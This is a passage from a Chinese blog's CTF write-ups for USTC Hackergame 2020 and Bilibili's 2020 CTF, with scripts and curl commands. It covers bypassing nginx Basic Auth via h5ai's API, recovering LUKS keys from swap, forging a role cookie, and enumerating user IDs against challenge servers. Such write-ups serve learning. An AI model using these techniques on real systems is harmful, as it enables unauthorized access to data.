class=\"hljs-params\">account</span>) </span>{    <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">'/api/eat'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ account }),      ...commonFetchOpt    });  }  <span class=\"hljs-keyword\">try</span> {    <span class=\"hljs-comment\">// 开一张信用卡</span>    <span class=\"hljs-keyword\">await</span> createCard(<span class=\"hljs-string\">'credit'</span>);    <span class=\"hljs-comment\">// 开 999 张储蓄卡，并给每张新开的储蓄卡转 167 块钱</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">3</span>; i &lt; <span class=\"hljs-number\">1002</span>; i++) {      <span class=\"hljs-keyword\">await</span> createCard(<span class=\"hljs-string\">'debit'</span>);      <span class=\"hljs-keyword\">await</span> transfer(<span class=\"hljs-number\">2</span>, i, <span class=\"hljs-number\">167</span>);    }    <span class=\"hljs-comment\">// 用储蓄卡 1 的初始资金 1000 度过 14 天</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">0</span>; i &lt; <span class=\"hljs-number\">14</span>; i++) {      <span class=\"hljs-keyword\">await</span> eatAndEndTheDay(<span class=\"hljs-number\">1</span>);    }    <span class=\"hljs-comment\">// 14 天肯定能赚够 1000 块钱了，该获取 flag 了</span>    <span class=\"hljs-keyword\">const</span> req = <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">'/api/user'</span>, { ...commonFetchOpt, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> });    <span class=\"hljs-keyword\">const</span> resp = <span class=\"hljs-keyword\">await</span> req.json();    <span class=\"hljs-built_in\">console</span>.log(resp.flag);  } <span class=\"hljs-keyword\">catch</span> (e) {    <span class=\"hljs-built_in\">console</span>.error(e);  }})();</code></pre>\n<h2>超基础的数理模拟器</h2>\n<blockquote><p>……<br>我们在 Hackergame 2020 的网站上部署了一项超基础的数理模拟器。 作为一名数理基础扎实的同学，你一定能够轻松通过模拟器的测试吧。</p></blockquote>\n<p>打开题目后发现要做 400 道定积分，而且答案还要取小数点后六位：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.8/29.png\" width=\"1497\" height=\"412\" class=\"lazy post-img\"></p>\n<p>这道题没有取巧的办法，只有老老实实把 400 道定积分全部做完…..吧？</p>\n<p>这么长的定积分谁手算啊，当然是要用 MatLab 来算啦！徒手转换 LaTex 到 MathLab 太麻烦了，写个脚本来做吧：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/27.png\" width=\"1150\" height=\"420\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/28.png\" width=\"1146\" height=\"539\" class=\"lazy post-img\"></p>\n<p>UserScript 在 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-js\">这里</a>，好孩子千万不要学习这种方法来解析 LaTex。</p>\n<h2>室友的加密硬盘</h2>\n<blockquote>\n<p>「我的家目录是 512 位 AES 加密的，就算电脑给别人我的秘密也不会泄漏……」你的室友在借你看他装着 Linux 的新电脑时这么说道。你不信，于是偷偷从 U 盘启动，拷出了他硬盘的一部分内容。</p>\n<p><a href=\"https://archive.org/details/roommates_disk_part.img\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>苏卡卡一开始试图把镜像直接挂载在虚拟机上，结果无法启动系统；于是先起了一个 Linux 虚拟机、在 Linux 下将 img 转换为 vmdk 再添加到虚拟机中，结果依然提示「未找到已安装的操作系统或操作系统安装器」。</p>\n<blockquote><p>中国民航于 1992 年在《中国民用航空局关于确保飞行安全的命令》文件中提出了 54 个字「八该一反对」，其中最重要的就是「反对盲目蛮干」</p></blockquote>\n<p>既然通过 img 文件直接启动没有成功，不如先看看这个 img 文件都有什么：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/18.png\" width=\"824\" height=\"864\" class=\"lazy post-img\"></p>\n<blockquote><p>不要在意这个 Ubuntu Kylin，最近狐狐在虚拟机里各种体验各种「国产 Linux 发行版」，虚拟机里正好有 Ubuntu Kylin 所以拿来用的。</p></blockquote>\n<p>由于之前阅读过一些通过内存转储破解全盘加密的文章，所以便去下载了 <a href=\"https://sourceforge.net/projects/findaes/\">findaes</a> 的源码，编译的同时再去重读之前的几篇文章获取思路。看到几篇文章中都是用 findaes 直接读取 raw 的内存转储，于是决定直接用 findaes 爆破硬盘映像文件。首先把 img 用 7z 解压出来，然后一个一个分区映像跑：</p>\n<pre><code class=\"hljs bash\">$ ./findaes /path/to/img1.raw</code></pre>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/19.jpg\" width=\"867\" height=\"480\" class=\"lazy post-img\"></p>\n<p>根据题干「我的家目录是 512 位 AES 加密的」，但是 findaes 找到的都是 AES-256，所以需要从中筛选出一对 offset 相差为 256bit 的 key 进行拼接，因此还需要注意一点，由于 Intel x86_64 的 little-endian、拼接 key 时需要倒序拼接。</p>\n<blockquote><p>其实这一点我还是比较熟悉的，安装 Hackintosh 时注入十六进制的设备属性时需要互换 bit 也是因为 little-endian。</p></blockquote>\n<p>剩下的就是一对一对 key 的用 <code>sudo cryptsetup luksAddKey --master-key-file</code> 试过去，直到成功解密为止。最后用 swap 里的最后一对 key 成功解密了分区并拿到了 flag <code>flag{lets_do_A_c01d_b00t_next_time}</code> （下次试试冷启动吧！），直到看到 flag 才明白本题的思路是 Linux 休眠后会把内存写入 swap 分区中（macOS 则是写入硬盘上的 <code>sleepimage</code> 文件中），因此和之前读过的从内存转储破解全盘加密的思路是完全一致的。最后再给大家推荐 Red Hat 知识库的一篇文章「<a href=\"https://access.redhat.com/solutions/1543373\">How to recover lost LUKS key or passphrase</a>」。</p>\n<h2>超简易的网盘服务器</h2>\n<blockquote>\n<p>…… 小 C 开始思考技术方案：“听说 h5ai 搭建云盘的方案是不错的 … 使用 Basic Auth 可以做访问控制，可以保护<a href=\"http://202.38.93.111:10120/\">根目录</a>下的文件不被非法的访问 … 等等，有一些文件是可以被分享的，需要一个 <a href=\"http://202.38.93.111:10120/Public\">/Public</a> 目录来共享文件！”</p>\n<p>三分钟后，小 C 同学完成了网盘的搭建。他想：“空着总不好，先得在云盘上放点东西！”。犹豫片刻，他掏出了自己珍藏了三个月的 flag 并上传到了云盘的<a href=\"http://202.38.93.111:10120/\">根目录</a>。</p>\n</blockquote>\n<p>这道题我好像是第五个还是第六个解出来的。这道题很多人没做出来还是有点令我惊讶的。</p>\n<p>直接访问「根目录」会提示 401 需要 HTTP Basic Authentication，聪明的 小 C 肯定不会把密码直接暴露出来的。访问 <code>/Public </code>目录却发现了 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_nginx-conf\"><code>dockerfile</code></a> 和 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_dockerfile\"><code>nginx.conf</code></a> 文件。从 dockerfile 中我们可以知道小 C 是怎么搭建的服务，而 <code>nginx.conf</code> 更值得我们关心（已省去无关紧要的部分）：</p>\n<pre><code class=\"hljs nginx\"><span class=\"hljs-attribute\">index</span> index.php index.html /_h5ai/public/index.php;<span class=\"hljs-comment\"># 根目录是私有目录，使用 basic auth 进行认证，只有我（超极致的小 C)自己可以访问</span><span class=\"hljs-attribute\">location</span> / {    <span class=\"hljs-attribute\">auth_basic</span> <span class=\"hljs-string\">\"easy h5ai. For visitors, please refer to public directory at `/Public!`\"</span>;    <span class=\"hljs-attribute\">auth_basic_user_file</span> /etc/nginx/conf.d/htpasswd;}<span class=\"hljs-comment\"># Public 目录是公开的，任何人都可以访问，便于我给大家分享文件</span><span class=\"hljs-attribute\">location</span> /Public {    <span class=\"hljs-attribute\">allow</span> all;    <span class=\"hljs-attribute\">index</span> /Public/_h5ai/public/index.php;}<span class=\"hljs-comment\"># PHP 的 fastcgi 配置，将请求转发给 php-fpm</span><span class=\"hljs-attribute\">location</span> <span class=\"hljs-regexp\">~ \\.php$</span> {         <span class=\"hljs-attribute\">fastcgi_pass</span>   <span class=\"hljs-number\">127.0.0.1:9000</span>;         <span class=\"hljs-attribute\">fastcgi_index</span>  index.php;         <span class=\"hljs-attribute\">fastcgi_param</span>  SCRIPT_FILENAME  $document_root$fastcgi_script_name;         <span class=\"hljs-attribute\">include</span>        fastcgi_params;}</code></pre>\n<p>由于 Nginx 配置文件不是连续匹配，因此访问 <code>.php</code> 结尾的路径是不会触发 401 HTTP Basic Auth 的（应该没有人会天真地试图获取 <code>/etc/nginx/conf.d/htpassword</code> 吧？）。既然如此，我们为什么不直接访问 <code>h5ai</code> 的 <code>index.php</code> 呢？首先让我们请求一下 <code>/Public</code> 目录下的 h5ai 后台页面 <code>/Public/_h5ai/public/index.php</code>：</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/Public/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>那么「根目录」下的 <code>/_h5ai/public/index.php</code> 呢？</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>不出所料，直接访问 <code>index.php</code> 也会返回 200 OK，而不是 401。</p>\n<p>虽然直接访问 <code>/_h5ai/public/index.php</code> 不会返回 401，但是 GET 这个路径默认是返回 h5ai 的后台调试页面。由于 h5ai 是开源的、我们可以前往 <a href=\"https://github.com/lrsjng/h5ai\">h5ai 的 GitHub</a> 对其代码进行审计，发现 <a href=\"https://github.com/lrsjng/h5ai/blob/master/src/_h5ai/private/php/core/class-api.php\">h5ai 提供了一系列 API</a>，可以通过 POST 请求列出目录内容和下载文件。首先试试能不能用 API 列出根目录下的文件内容：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/json;charset=UTF-8'</span> --data-binary <span class=\"hljs-string\">'{\"action\":\"get\",\"items\":{\"href\":\"/\",\"what\":1}}'</span> | jq{  <span class=\"hljs-string\">\"items\"</span>: [    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603986831000,      <span class=\"hljs-string\">\"size\"</span>: 789419,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">true</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">true</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/Public/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603986830000,      <span class=\"hljs-string\">\"size\"</span>: 396458,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">false</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">false</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/flag.txt\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603489315000,      <span class=\"hljs-string\">\"size\"</span>: 24    }  ]}</code></pre>\n<p>诶嘿嘿，我们看到 <code>/flag.txt</code> 啦！接下来就是用 API 下载 <code>flag.txt</code> 文件了：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/x-www-form-urlencoded'</span> --data-raw <span class=\"hljs-string\">'action=download&amp;as=flag.txt.tar&amp;type=php-tar&amp;baseHref=/&amp;hrefs[0]=/flag.txt'</span> -o flag.txt.tar$ tar xzf flag.txt.tar$ cat flag.txt <span class=\"hljs-comment\"># Flag 到手啦</span></code></pre>\n<h2>超安全的代理服务器</h2>\n<blockquote>\n<p>在 2039 年，爆发了一场史无前例的疫情。为了便于在各地的同学访问某知名大学「裤子大」的网站进行「每日健康打卡」，小 C 同学为大家提供了这样一个代理服务。曾经信息安全专业出身的小 C 决定把这个代理设计成最安全的代理。</p>\n<p><strong>提示：浏览器可能会提示该 TLS 证书无效，与本题解法无关，信任即可。</strong></p>\n</blockquote>\n<p>「浏览器可能会提示该 TLS 证书无效」这句话至关重要。想想看为什么别的题都是通过 HTTP 访问的、唯独这道题要用 HTTPS？什么东西需要 HTTPS 才能工作、在 HTTP 下不工作呢？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/9.png\" width=\"1165\" height=\"294\" class=\"lazy post-img\"></p>\n<p>虽然 HTTP/2 本身不要求 TLS 实现（例如 H2C、HTTP/2 ClearText）、并且有通过 HTTP/1.1 升级到 HTTP/2 的协商方法（参见 <a href=\"https://blog.skk.moe/post/http3-alt-svc/#HTTP-2-%E7%9A%84%E5%8D%8F%E5%95%86%E6%96%B9%E5%BC%8F\">我之前的文章「HTTP/3：HTTP Alternative Services 作为协商方式」中的「HTTP/2 的协商方式」章节</a> ），但是所有支持 HTTP/2 的浏览器都要求 HTTP/2 必须通过 TLS 传输、并在 Client Hello 中通过 ALPN Protocol 进行协商。扯远了，看看题目。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/8.png\" width=\"750\" height=\"400\" class=\"lazy post-img\"></p>\n<p>「我们已经向您 <strong>推送（PUSH）</strong> 了最新的 <strong>Secret</strong> ，但是你可能无法直接看到它」。现在我们知道了，这道题和 HTTP/2 Server Push 有关。解码 HTTP/2 帧最好的方法自然是使用 Wireshark。首先我们要让 Wireshark 能够解密 HTTPS 内容，最简单的方法是使用 <code>SSLKEYLOGFILE</code> 环境变量。</p>\n<blockquote><p>警告！使用 <code>SSLKEYLOGFILE</code> 环境变量非常危险，任何获取该变量的软件都可以随意解密你的 HTTPS 流量！因此，务必仅针对某一需要解密流量的软件、在某一次性 Session 下设置该环境变量！</p></blockquote>\n<p>打开 Chrome，在 <code>chrome://version/</code> 中查看可执行文件路径：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/10.png\" width=\"1196\" height=\"270\" class=\"lazy post-img\"></p>\n<p>然后在终端中通过预设环境变量直接启动 Chrome：</p>\n<pre><code class=\"hljs bash\">SSLKEYLOGFILE=<span class=\"hljs-string\">\"/path/to/ssllog.txt\"</span> <span class=\"hljs-string\">\"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome\"</span></code></pre>\n<p>启动 Wireshark 偏好设置中找到 Protocol - TLS、配置 (Pre)-Master-Secret log filename：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/11.png\" width=\"687\" height=\"514\" class=\"lazy post-img\"></p>\n<p>现在，再通过启动的 Chrome 访问「Smart Proxy!」，可以看到 Wireshark 完整解密了 Chrome 的所有 HTTPS 流量。在 Wireshark 中使用下述过滤器找出本题的流量：</p>\n<pre><code class=\"hljs plaintext\">ip.addr == 146.56.228.227</code></pre>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/12.png\" width=\"1371\" height=\"279\" class=\"lazy post-img\"></p>\n<p>在过滤后的流量中我们很快就可以找到 PUSH_PROMISE 帧、告诉了我们如何获得 secret 和第一个 flag：<code>GET /ebe087a0-68e5-4280-b605-b98b89488e1e</code>。</p>\n<p>获得第一个 flag 后，我们可以在终端中 Ctrl + C 关闭 Chrome。之后从 Dock、桌面、Finder、Spotlight 等方法「正常启动」Chrome 是不会再将 TLS 握手的信息输出到 SSLKEYLOGFILE 的。</p>\n<h2>尾声</h2>\n<p>今年的 USTC Hackergame 对我来说运气的成分远高于能力的成分，不少题目都是侥幸做出来的，而且对 <code>binary</code> 和 <code>math</code> 一窍不通的我这两类题几乎一道题都没做出来；比赛期间甚至收到了主办方邀请提交「非官方题解」，受宠若惊（狐狐暗自高兴）；最后拿到了 3250 分，排名侥幸挤进了前 50、与真正的 CS 大佬和 CTF 师傅们在榜上合影，瑟瑟发抖（非常害怕）。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.9/31.png\" width=\"1109\" height=\"135\" class=\"lazy post-img\"></p>\n<p>没有对比就没有伤害，相比 <a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">两周前 Bilibili 的「1024  程序员节 CTF」</a>，USTC Hackergame 不论是在难度梯度分布、题目水平、趣味性、活动整体质量上都远高一个层次。引用组委会成员「Zihan Zheng」在知乎「<a href=\"https://www.zhihu.com/question/351947330/answer/866177844\">参加中国科学技术大学第六届信息安全大赛（Hackergame 2019）是怎样一种体验？</a>」提问中的回答：</p>\n<blockquote><p>我们举办的 Hackergame 的初衷就是对新人友好，增加趣味性，强调教育意义。我看到有些同学反馈说题目偏简单、逆向题偏少等等，我想强调，我们这个比赛虽然是提交 flag 的形式，但<strong>不是 CTF 比赛，不会与国内外的 CTF 比赛对标</strong>。我们会把这个特色坚持下去，希望大家不要从经验丰富的 CTF 选手视角来评价我们的比赛。</p></blockquote>\n<p>如果说 Hackergame 的初衷是「对新人友好，增加趣味性，强调教育意义」，IMHO 不论是 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">往届</a> 还是今年的比赛都完美达成了这一点；毫无疑问地，明年的比赛我依然会参加。最后当然是要在「尾声」中喊一句口号：</p>\n<blockquote><p>「我有一个绝妙的解法，可惜我号太少，说不出来」</p></blockquote>\n<div class=\"license\"> <div class=\"license-title\">USTC Hackergame 2020（中科大信安赛）write up</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hackergame-2020-write-up/\">https://blog.skk.moe/post/hackergame-2020-write-up/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-11-06</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hackergame-2020-write-up/"},{"title":"Bilibili 2020「1024 程序员节」CTF Write Up","date":"2020-10-25 09:44:00","description":"\n<blockquote><p>周六不放假休息，还在这加班搞 CTF？</p></blockquote>\n<p>10 月 24 日不睡觉、凌晨两点钟我还在水群，结果在 USTC@LUG 的群里看见有人在打 Bilibili 的 CTF。我刚刚好一年（指 370 天）没有打过 CTF 了（上一次打正式的 CTF 还是去年参加的 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">USTC Hackergame 2019</a>），所以想着来玩玩。虽然 CTF 结束之前不应该分享和公开 Write Up 和题解，不过 Bilibili 这 CTF 既然这么离谱，那我也没必要按照常理出牌。</p>\n<span></span><blockquote><p>本文更新于 2020 年 10 月 25 日下午 6 点（China Standard Time）。</p></blockquote>\n<p>由于这次 Bilibili 的 CTF 题实在没有什么存档研究的必要，我的 Write Up 里就留一些代码片段和截图，大家也没有复盘的必要。</p>\n<h2>页面的背后是什么 &amp; 真正的秘密只有特殊的设备才能看到</h2>\n<p>一个页面，两道题。打开来就是这个页面：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/1.png\" width=\"1901\" height=\"720\" class=\"lazy post-img\"></p>\n<p>curl 太慢了而且没有代码高亮、直接在地址栏通过 <code>view-source:</code> 看看源码，把 JavaScript 拿出来：</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/admin\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            <span class=\"hljs-keyword\">var</span> input = <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">\"flag1\"</span>);            input.value = <span class=\"hljs-built_in\">String</span>(data.data);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag1'</span>).html(<span class=\"hljs-string\">\"接口异常，请稍后再试～\"</span>);        }    }})</code></pre>\n<p>所以第一题的 Flag 就是 <code>GET /api/admin</code> 了。在页面上 <code>#flag1</code> 元素是被包裹在一个 <code>display: none</code> 的容器里的，不过审查元素或者直接请求访问 API 都能拿到第一题的 Flag。</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/2\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag2'</span>).html(<span class=\"hljs-string\">\"flag2: \"</span> + data.data);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag2'</span>).html(<span class=\"hljs-string\">\"需要使用bilibili Security Browser浏览器访问～\"</span>);        }    }})</code></pre>\n<p>第二题要求用「bilibili Security Browser」访问，有没有让你想起来前年 USTC Hackergame 2018 的「黑曜石浏览器」？</p>\n<p>直接用 <code>bilibili Security Browser</code> 作为 User-Agent 请求 API 即可获得 Flag，注意别忘了带上 <code>Session</code> 这个 Cookie，这个是 Bilibili 账户登录状态。</p>\n<blockquote>\n<p>Chromium Based 浏览器本身内置了修改了 User-Agent 的功能。打开 DevTools 的设置菜单、在「Devices」里添加一个新的设备，此处可以指定 User-Agent：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/2.png\" width=\"830\" height=\"301\" class=\"lazy post-img\"></p>\n<p>之后就可以使用「bilibili Security Browser」访问了：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/3.png\" width=\"751\" height=\"666\" class=\"lazy post-img\"></p>\n</blockquote>\n<h2>密码是啥？</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/4.png\" width=\"1905\" height=\"853\" class=\"lazy post-img\"></p>\n<p>这道题没啥好 Write Up 的，全部靠猜。用户名是 <code>admin</code> 密码是 <code>bilibili</code>。</p>\n<blockquote><p>你这算哪门子 CTF 啊？又不靠社工，真就硬猜？</p></blockquote>\n<p>以及，你给我翻译翻译，什么叫做 falg？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/5.png\" width=\"431\" height=\"731\" class=\"lazy post-img\"></p>\n<h2>对不起，权限不足～</h2>\n<p>首次访问：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/6.png\" width=\"1899\" height=\"543\" class=\"lazy post-img\"></p>\n<p>刷新一次：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/7.png\" width=\"1901\" height=\"538\" class=\"lazy post-img\"></p>\n<p>有趣，看一下源代码：</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/4\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-built_in\">console</span>.log(data);        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"欢迎超级管理员登陆～答案是 : {{ \"</span> + data.data + <span class=\"hljs-string\">\" }}\"</span>.toLowerCase() )        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"有些秘密只有超级管理员才能看见哦~\"</span>)        }    }})</code></pre>\n<p>又是 API 返回 flag，用手指头想都知道鉴权是 Cookie 做的，打开 F12 查看 Cookie：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/8.png\" width=\"646\" height=\"46\" class=\"lazy post-img\"></p>\n<p>两个 Cookie，一个是 <code>session</code>，是 Bilibili 账户登录状态的 cookie；另一个是 <code>role</code>，毫无疑问就是我们下手的对象：</p>\n<pre><code class=\"hljs plaintext\">role=ee11cbb19052e40b07aac0ca060c23ee</code></pre>\n<p>打 CTF 的人应该早就把这一串刻进 DNA 里了。即使不知道这串字符是什么东西，丢进搜索引擎后也会知道这是 <code>user</code> 的 MD5。接下来思路就很清晰了，通过将 <code>role</code> 的 Cookie 改成另一串 MD5 即可。</p>\n<p>不过这就是这道题离谱的地方了，这道题要把 <code>role</code> 改成 <code>Administrator</code> 的 MD5（你没有看错，首字母是大写的）：</p>\n<pre><code class=\"hljs plaintext\">role=7b7bc2512ee1fedcd76bdc68926d4f7b</code></pre>\n<p>改好 Cookie 刷新页面就可以拿到 flag 了。</p>\n<h2>别人的秘密</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/9.png\" width=\"1897\" height=\"512\" class=\"lazy post-img\"></p>\n<pre><code class=\"hljs js\">$(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{    (<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">$</span>) </span>{        $.getUrlParam = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">name</span>) </span>{            <span class=\"hljs-keyword\">var</span> reg = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">RegExp</span>(<span class=\"hljs-string\">\"(^|&amp;)\"</span> + name + <span class=\"hljs-string\">\"=([^&amp;]*)(&amp;|$)\"</span>);            <span class=\"hljs-keyword\">var</span> r = <span class=\"hljs-built_in\">window</span>.location.search.substr(<span class=\"hljs-number\">1</span>).match(reg);            <span class=\"hljs-keyword\">if</span> (r != <span class=\"hljs-literal\">null</span>) <span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">unescape</span>(r[<span class=\"hljs-number\">2</span>]); <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">null</span>;        }    })(jQuery);    <span class=\"hljs-keyword\">var</span> uid = $.getUrlParam(<span class=\"hljs-string\">'uid'</span>);    <span class=\"hljs-keyword\">if</span> (uid == <span class=\"hljs-literal\">null</span>) {        uid = <span class=\"hljs-number\">100336889</span>;    }    $.ajax({        <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/5?uid=\"</span> + uid,        <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,        <span class=\"hljs-attr\">success</span>: <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{            <span class=\"hljs-built_in\">console</span>.log(data);            <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>) {                <span class=\"hljs-comment\">// 如果有值：前端跳转</span>                $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"欢迎超级管理员登陆～flag : \"</span> + data.data)            } <span class=\"hljs-keyword\">else</span> {                <span class=\"hljs-comment\">// 如果没值</span>                $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"这里没有你想要的答案～\"</span>)            }        }    })});</code></pre>\n<p>这道题更离谱，上来先在 jQuery 的 <code>$</code> 对象下挂了一个 <code>getUrlParam</code> 方法用来获取 uid、然后还有一个当 uid 不存在时给予默认值的方法（默认值取 <code>100336889</code>），接下来就是 <code>GET /api/ctf/5?uid=${uid}</code>。</p>\n<blockquote><p>千万不要学习本题源码中的方法解析 URL 参数！<code>unescape</code> 不能处理非 ASCII 字符，极易产生乱码，在生产环境中只应使用 WHATWG URL API 的 <code>searchParams</code> ！</p></blockquote>\n<p>这道题没什么好说的，直接遍历就好了，Node.js 解法如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> http = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'http'</span>);<span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">get</span>(<span class=\"hljs-params\">hostname, path</span>) </span>{  <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Promise</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">resolve, reject</span>) =&gt;</span> {    <span class=\"hljs-keyword\">const</span> req = http.request(      { hostname, path, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> },      <span class=\"hljs-function\">(<span class=\"hljs-params\">res</span>) =&gt;</span> {        <span class=\"hljs-keyword\">const</span> body = [];        res.on(<span class=\"hljs-string\">'data'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">chunk</span>) =&gt;</span> { body.push(chunk); });        